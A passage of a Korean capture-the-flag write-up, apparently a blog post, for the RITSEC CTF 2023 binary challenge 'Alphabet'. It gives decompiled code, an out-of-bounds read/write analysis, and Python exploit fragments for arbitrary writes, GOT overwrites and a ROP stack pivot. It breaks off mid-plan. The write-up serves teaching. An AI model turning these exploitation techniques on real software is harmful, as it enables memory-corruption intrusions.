@@ -1,0 +1,392 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="https:&#x2F;&#x2F;ctftime.org&#x2F;event&#x2F;1860   This new protocol let’s you update the official English alphabet in real time! Easy as A#_nc alphabet.challenges.ctf.ritsec.club 1337   [21 solves &#x2F; 500 points]">
+<meta property="og:type" content="article">
+<meta property="og:title" content="RITSEC CTF 2023 - Alphabet (oob read, write)">
+<meta property="og:url" content="https://jiravvit.github.io/230412-ritsecctf2023-3Alphabet/index.html">
+<meta property="og:site_name" content="jir4vvit">
+<meta property="og:description" content="https:&#x2F;&#x2F;ctftime.org&#x2F;event&#x2F;1860   This new protocol let’s you update the official English alphabet in real time! Easy as A#_nc alphabet.challenges.ctf.ritsec.club 1337   [21 solves &#x2F; 500 points]">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://jiravvit.github.io/images/230412-ritsecctf2023-3Alphabet/Screenshot%202023-04-12%20at%2020.37.20.png">
+<meta property="article:published_time" content="2023-04-11T22:00:00.000Z">
+<meta property="article:modified_time" content="2023-04-12T18:54:30.153Z">
+<meta property="article:author" content="jir4vvit">
+<meta property="article:tag" content="shellcode">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://jiravvit.github.io/images/230412-ritsecctf2023-3Alphabet/Screenshot%202023-04-12%20at%2020.37.20.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/judi2.jpg">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/judi2.jpg" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/judi2.jpg">
+        
+      
+    
+    <!-- title -->
+    <title>RITSEC CTF 2023 - Alphabet (oob read, write)</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Category</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/230412-ritsecctf2023-2assembly-hopping/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://jiravvit.github.io/230412-ritsecctf2023-3Alphabet/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://jiravvit.github.io/230412-ritsecctf2023-3Alphabet/&text=RITSEC CTF 2023 - Alphabet (oob read, write)"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://jiravvit.github.io/230412-ritsecctf2023-3Alphabet/&title=RITSEC CTF 2023 - Alphabet (oob read, write)"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://jiravvit.github.io/230412-ritsecctf2023-3Alphabet/&is_video=false&description=RITSEC CTF 2023 - Alphabet (oob read, write)"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=RITSEC CTF 2023 - Alphabet (oob read, write)&body=Check out this article: https://jiravvit.github.io/230412-ritsecctf2023-3Alphabet/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://jiravvit.github.io/230412-ritsecctf2023-3Alphabet/&title=RITSEC CTF 2023 - Alphabet (oob read, write)"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://jiravvit.github.io/230412-ritsecctf2023-3Alphabet/&title=RITSEC CTF 2023 - Alphabet (oob read, write)"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://jiravvit.github.io/230412-ritsecctf2023-3Alphabet/&title=RITSEC CTF 2023 - Alphabet (oob read, write)"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://jiravvit.github.io/230412-ritsecctf2023-3Alphabet/&title=RITSEC CTF 2023 - Alphabet (oob read, write)"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://jiravvit.github.io/230412-ritsecctf2023-3Alphabet/&name=RITSEC CTF 2023 - Alphabet (oob read, write)&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://jiravvit.github.io/230412-ritsecctf2023-3Alphabet/&t=RITSEC CTF 2023 - Alphabet (oob read, write)"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Analysis"><span class="toc-number">1.</span> <span class="toc-text">Analysis</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Solve"><span class="toc-number">2.</span> <span class="toc-text">Solve</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Exploit-Code"><span class="toc-number">2.1.</span> <span class="toc-text">Exploit Code</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        RITSEC CTF 2023 - Alphabet (oob read, write)
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">jir4vvit</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2023-04-11T22:00:00.000Z" itemprop="datePublished">2023-04-12</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/WriteUp/">WriteUp</a> › <a class="category-link" href="/categories/WriteUp/RITSEC/">RITSEC</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/shellcode/" rel="tag">shellcode</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <ul>
+<li><a target="_blank" rel="noopener" href="https://ctftime.org/event/1860">https://ctftime.org/event/1860</a></li>
+</ul>
+<blockquote>
+<p>This new protocol let’s you update the official English alphabet in real time! Easy as A#_<br><code>nc alphabet.challenges.ctf.ritsec.club 1337</code></p>
+</blockquote>
+<ul>
+<li>[21 solves &#x2F; 500 points]</li>
+</ul>
+<p>웬만한 씨텝은 취약점 찾는 것보다 익스가 훨씬 더 어려운 것 같다.. ㅠㅠ 이 문제가 근래 풀어본 문제 중에 익스가 가장 힘들고 어려웠다.</p>
+<h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><p>먼저 <code>main</code> 함수이다.</p>
+<p>참고로 seccomp이 있어서 확인해야 한다. 대충 <code>flag.txt orw</code>해야하고 <code>mprotect</code> 함수가 허용되어 있다.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+8h] [rbp-58h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+Ch] [rbp-54h]</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">56</span>]; <span class="comment">// [rsp+20h] [rbp-40h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v6; <span class="comment">// [rsp+58h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  seccomp_rules();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">      <span class="title function_">puts</span><span class="params">(<span class="string">&quot;Running very important code and threads&quot;</span>)</span>;</span><br><span class="line">    <span class="keyword">while</span> ( !fgets(buf, <span class="number">0x2D</span>, <span class="built_in">stdin</span>) );         <span class="comment">// fgets@got -&gt; gets</span></span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( i &gt; <span class="number">44</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_8;</span><br><span class="line">      <span class="keyword">if</span> ( buf[i] == <span class="string">&#x27;\n&#x27;</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    v3 = i;</span><br><span class="line">LABEL_8:</span><br><span class="line">    buf[v3] = <span class="number">0</span>;</span><br><span class="line">    use_packet(buf, v3);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Scrambled alphabet sent&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>주석은 익스와 관련된건데.. 일단 무시하고 코드 분석을 해보자. <code>fgets</code> 함수로 0x2D 크기만큼 <code>buf</code>에 입력을 받아서 오버플로우는 일어나지 않는다. <code>\n</code>이 오면 <code>break</code>하고 입력한 size와 함께 <code>use_packet</code> 함수를 실행한다. size가 44보다 크면 <code>v3</code> 변수가 정의되지 않으니 조심하자. 익스할 때 <code>fgets@got</code>를 <code>gets</code>함수로 덮었었는데 <code>v3</code> 변수가 정의되지 않아 익스 코드에서 억지로 정의해줬다.</p>
+<p><code>use_packet</code> 함수를 살펴보자.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">use_packet</span><span class="params">(<span class="type">char</span> *buf, <span class="type">int</span> len)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> *v2; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">void</span> *v3; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">char</span> *ptr; <span class="comment">// [rsp+20h] [rbp-30h]</span></span><br><span class="line">  __int64 idx1; <span class="comment">// [rsp+28h] [rbp-28h]</span></span><br><span class="line">  __int64 idx2; <span class="comment">// [rsp+30h] [rbp-20h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Using packet&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( len &gt; <span class="number">17</span> &amp;&amp; *buf == <span class="string">&#x27;Z&#x27;</span> &amp;&amp; buf[<span class="number">1</span>] == <span class="number">8</span> &amp;&amp; calc_checksum(buf, len) == buf[len - <span class="number">1</span>] )<span class="comment">// 마지막 바이트 검사</span></span><br><span class="line">  &#123;</span><br><span class="line">    ptr = <span class="built_in">malloc</span>(buf[<span class="number">1</span>]);</span><br><span class="line">    idx1 = *(buf + <span class="number">2</span>);</span><br><span class="line">    idx2 = *(buf + <span class="number">10</span>);</span><br><span class="line">    <span class="keyword">if</span> ( idx1 &lt;= <span class="number">18</span> &amp;&amp; idx2 &lt;= <span class="number">18</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v2 = qword_404088;</span><br><span class="line">      *(buf + <span class="number">0x12</span>) = global_alphabet;</span><br><span class="line">      *(buf + <span class="number">26</span>) = v2;</span><br><span class="line">      <span class="built_in">strcpy</span>(buf + <span class="number">34</span>, <span class="string">&quot;qrstuvwxyz&quot;</span>);</span><br><span class="line">      *ptr = *&amp;buf[idx1 + <span class="number">18</span>];                  <span class="comment">// oob read</span></span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Grabbed new alphabet characters: %s\n&quot;</span>, ptr);</span><br><span class="line">      *&amp;buf[idx2 + <span class="number">18</span>] = *ptr;                  <span class="comment">// oob write</span></span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Placed new letters into alphabet&quot;</span>);</span><br><span class="line">      v3 = *(buf + <span class="number">26</span>);</span><br><span class="line">      global_alphabet = *(buf + <span class="number">18</span>);            <span class="comment">// bss 영역에 데이터 쓰기 가능</span></span><br><span class="line">      qword_404088 = v3;</span><br><span class="line">      qword_404090 = *(buf + <span class="number">34</span>);</span><br><span class="line">      word_404098 = *(buf + <span class="number">21</span>);</span><br><span class="line">      byte_40409A = buf[<span class="number">44</span>];</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Updated the alphabet&quot;</span>);</span><br><span class="line">      <span class="built_in">free</span>(ptr);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;An index is too big&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;                                               <span class="comment">// ___stack_chk_fail@got -&gt; ret</span></span><br></pre></td></tr></table></figure>
+
+<p>처음 if문으로 이것저것 검사한다. 입력값의 첫 글자는 <code>Z</code>여야 한다. 두 번째 글자는 <code>\x08</code>이어야 한다. 그리고 <code>calc_checksum</code> 함수로 입력값의 마지막 글자를 검사하고 있다. 익스 코드 짤 때 python으로 <code>calc_checksum</code> 함수를 구현해서 마지막 글자 한 바이트를 넣어주자. 그 다음 글자는 <code>buf</code>의 index로 사용하고 있고, 마지막에는 <code>bss</code> 영역에 값을 복사해주고 있다. payload를 보내야하는 형식은 아래와 같다. (구조체 정리)</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;Z\x08&#x27;</span></span><br><span class="line">payload += p64(idx1, signed=<span class="literal">True</span>) <span class="comment"># idx1 =&gt; oob read</span></span><br><span class="line">payload += p64(idx2, signed=<span class="literal">True</span>) <span class="comment"># idx2 =&gt; oob write</span></span><br><span class="line">payload += p8(calc_checksum(payload))</span><br></pre></td></tr></table></figure>
+
+<p><code>idx1</code>과 <code>idx2</code> 크기 제한을 하고 있는데, 음수는 제한하지 않아 oob를 의심할 수 있다. (그래서 위의 구현에서 <code>signed=True</code>를 사용했다.)</p>
+<p>이제 취약점을 찾아보자. <code>*ptr = *&amp;buf[idx1 + 18];</code> 이 라인으로 <code>*ptr</code>을 정의해주는데 바로 아래 줄에서 <code>printf</code>로 <code>ptr</code>을 출력해주기 때문에 스택에 있는 주소를 leak할 수 있다.(oob read) 그리고 <code>*&amp;buf[idx2 + 18] = *ptr;</code> 이 라인을 통해 oob write가 발생할 수 있다. 자. 이 두 취약점이 발생할 수 있는 이유는 <code>idx1</code>와 <code>idx2</code>가 우리의 입력값이고, 이 입력값 인덱스를 검증하지 않아서 <code>buf</code>에서 벗어난 곳에 접근할 수 있기 때문이다. </p>
+<p>oob write는 익스할 때 아래처럼 구현해서 사용했다.</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">aawb</span>(<span class="params">addr, val</span>):</span><br><span class="line">  <span class="comment"># buf + idx2 + 18 = addr</span></span><br><span class="line">  <span class="comment"># 0x7ffd30bf3da0 + idx2 + 18 = 0x1234</span></span><br><span class="line">  <span class="comment"># idx2 = addr - buf - 18</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># aawb(0x12345678, 0x41)</span></span><br><span class="line">  <span class="comment"># 0x401664 &lt;use_packet+391&gt; mov    QWORD PTR [rdx], rax</span></span><br><span class="line">  <span class="comment"># $rax   : 0x4000000060041</span></span><br><span class="line">  <span class="comment"># $rdx   : 0x12345678</span></span><br><span class="line"></span><br><span class="line">  payload = <span class="string">b&#x27;Z\x08&#x27;</span></span><br><span class="line">  payload += p64(<span class="built_in">next</span>(libc.search(<span class="built_in">bytes</span>([val]))) - buf - <span class="number">18</span>, signed=<span class="literal">True</span>)</span><br><span class="line">  payload += p64(addr - buf - <span class="number">18</span>, signed=<span class="literal">True</span>)</span><br><span class="line">  payload += p8(calc_checksum(payload))</span><br><span class="line"></span><br><span class="line">  p.sendlineafter(<span class="string">&#x27;threads\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># aawb는 한 바이트씩 썼지만 aaw는 aawb를 호출해서 8바이트를 쓸 것</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">aaw</span>(<span class="params">addr, values</span>):</span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(values)):</span><br><span class="line">    aawb(addr+i, values[i])</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*ptr = *&amp;buf[idx1 + <span class="number">18</span>];</span><br><span class="line">*&amp;buf[idx2 + <span class="number">18</span>] = *ptr;  </span><br></pre></td></tr></table></figure>
+<p>입력값이 <code>idx2</code>니까 <code>payload</code>에서 <code>idx2</code>에 들어갈 부분은 <code>ptr - buf - 18</code>이다. 위의 내가 만든 python 함수 <code>aawb</code>에서는 <code>ptr</code>을 <code>addr</code>로 지정했다. 이 위치에 들어갈 값은 <code>idx1</code>에 따라 결정되는데 이것은 <code>libc</code>에서 <code>/bin/sh</code> 문자열을 찾는 것처럼 <code>next(libc.search(bytes([val])) - buf - 18</code>로 작성해주었다. <code>- buf - 18</code>을 해준 이유는 <code>idx2</code>에 들어갈 값을 찾는 것과 동일한 원리이다. 참고로 <code>next(libc.search(bytes([val]))</code>은 <code>libc</code>에서 <code>val</code> 값을 찾는 것인데, <code>val</code>은 한 바이트이다. </p>
+<p>왜 한 바이트씩 찾아서 값을 써줄까? 만약 <code>x 주소</code>에 <code>0x41424344</code>이라는 값을 쓰고 싶다고 하자. 이를 위해서 <code>0x41424344이 저장된 주소</code>를 찾아야 한다. 하지만 저 값이 저장된 주소는 찾기가 힘들 수도 있다. 그래서 한 바이트씩 찾아 써주는 것이다. 전체 값을 쓰기 위해서 <code>aaw</code>라는 함수를 정의했고 쓰고 싶은 값 길이만큼 <code>aawb</code>를 호출해서 값을 쓴다. </p>
+<p>문제에서 <code>while(1)</code>로 입력값을 계속 쓸 수 있어서 이와 같은 발상이 가능했다.</p>
+<p>마지막으로 우리가 python으로 구현해야할 <code>calc_checksum</code>이다.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">calc_checksum</span><span class="params">(<span class="type">const</span> <span class="type">void</span> *buf, <span class="type">int</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int8 result; <span class="comment">// [rsp+1Bh] [rbp-15h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+1Ch] [rbp-14h]</span></span><br><span class="line">  <span class="type">void</span> *dest; <span class="comment">// [rsp+20h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  dest = <span class="built_in">malloc</span>(size);</span><br><span class="line">  <span class="built_in">memcpy</span>(dest, buf, size);</span><br><span class="line">  result = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; size - <span class="number">1</span>; ++i )</span><br><span class="line">    result += *(dest + i) ^ <span class="number">0x55</span>;</span><br><span class="line">  <span class="built_in">free</span>(dest);                                   <span class="comment">// free@got -&gt; printf</span></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>xor을 두 번하면 원래대로 돌아오는 성질을 이용하면 된다.</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">calc_checksum</span>(<span class="params">data</span>):</span><br><span class="line">  result = <span class="number">0</span></span><br><span class="line">  <span class="keyword">for</span> d <span class="keyword">in</span> data:</span><br><span class="line">    result += d ^ <span class="number">0x55</span></span><br><span class="line">  <span class="comment"># print(repr(result))</span></span><br><span class="line">  <span class="keyword">return</span> result &amp; <span class="number">0xff</span> <span class="comment"># 1 byte</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><ol>
+<li>stack과 libc base를 구한다.</li>
+<li>직접 구현한 <code>aaw</code> 함수를 이용하여 rop payload를 <code>bss</code> 영역에 써준다.</li>
+</ol>
+<ul>
+<li>왜 이런 payload를 썼는지는 아래에서 이해할 수 있다.  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">bss = <span class="number">0x404800</span> <span class="comment"># bss의 정중앙</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># (!)</span></span><br><span class="line">rop_payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">rop_payload += p64(libc.sym[<span class="string">&#x27;gets&#x27;</span>])</span><br><span class="line">rop_payload += p64(libc.sym[<span class="string">&#x27;printf&#x27;</span>])</span><br><span class="line">rop_payload += p64(ret)</span><br><span class="line">rop_payload += p64(<span class="number">0x42424243</span>)</span><br><span class="line">rop_payload += p64(<span class="number">0x42424244</span>) <span class="comment"># 404820</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># (!!)</span></span><br><span class="line">rop_payload += p64(pop_rsp) <span class="comment"># &lt;----!!!</span></span><br><span class="line">rop_payload += p64(buf + <span class="number">0x50</span>) <span class="comment"># 두 번째 스택 피봇팅</span></span><br><span class="line"></span><br><span class="line">aaw(bss, rop_payload) </span><br></pre></td></tr></table></figure></li>
+</ul>
+<ol start="3">
+<li><code>got</code>들을 덮어준다.</li>
+</ol>
+<ul>
+<li><code>free@got -&gt; printf</code>, <code>__stack_chk_fail@got -&gt; ret</code>, <code>fgets@got -&gt; gets</code></li>
+<li>이를 위해 bss 영역에 <code>p64(libc.sym[&#39;gets&#39;])</code>, <code>p64(libc.sym[&#39;printf&#39;])</code>, <code>p64(ret)</code>을 써주었다. <code>(!)</code></li>
+<li>got를 덮을 때는 <code>aaw</code> 함수를 사용하지 않고 바로 paylaod를 보내서 덮어주었다. (쓸 필요성 못 느낌)</li>
+<li>왜냐하면 <code>fgets@got</code>를 <code>gets</code> 함수로 덮을 때 만약 한 바이트씩 덮게 된다면 한 바트씩 바뀐 잘못된 주소를 호출하기 때문이다.</li>
+<li><code>fgets@got -&gt; gets</code> 덮을 때 <code>b&#39;a&#39; * 0x12</code>을 추가로 보내주었다. 왜냐하면 <code>free@got</code>을 덮어서 <code>printf</code>로 덮어서 fsb가 발생하는 것을 노렸는데, 만약 저 더미데이터를 보내주지 않으면 글자수가 17자로 <code>fsb</code>로 값을 쓰기엔 턱없이 부족하기 때문에 혹시몰라 더미데이터도 함께 보내주었다.</li>
+</ul>
+<p>(현재 상황) <code>main</code>함수에서 <code>fgets</code> 대신 <code>gets</code>가 실행되므로 <code>bof</code>가 터짐! (카나리때문에 추가적으로 <code>__stack_chk_fail@got</code>을 <code>ret</code>으로 덮어줌!) <code>calc_checksum</code> 함수에서 <code>fgets</code> 함수 대신 <code>printf</code>가 실행되므로 <code>fsb</code>가 터짐! </p>
+<ol start="4">
+<li><code>fsb</code>를 이용하여 <code>rbp</code>를 변경하여 흐름을 <code>bss</code> 영역으로 돌린다. 이 <code>bss</code> 영역은 2번에서 적은 부분<code>(!!)</code>이고 <code>pop_rsp</code>를 실행할 것이다. (스택 피봇팅 1) &lt;- 참고로 여기서 흐름이 <code>bss</code> 영역으로 바뀌어서, 즉 <code>rbp</code>가 <code>bss</code> 영역의 주소로 바뀌어서 조금 안좋은 일이 일어날 수 있다. 이는 맨 마지막에 이야기한다. <code>***</code>&gt;</li>
+</ol>
+<ul>
+<li><code>fsb</code>는 <code>calc_checksum</code> 함수에서 터진다. 이 함수안에서의 <code>rbp</code>는 <code>calc_checksum</code> 함수를 호출한 <code>use_packet</code>의 <code>rbp</code>가 저장된 스택 주소이다. </li>
+<li><code>buf</code>와 위 스택 주소의 offset은 0x90이다.</li>
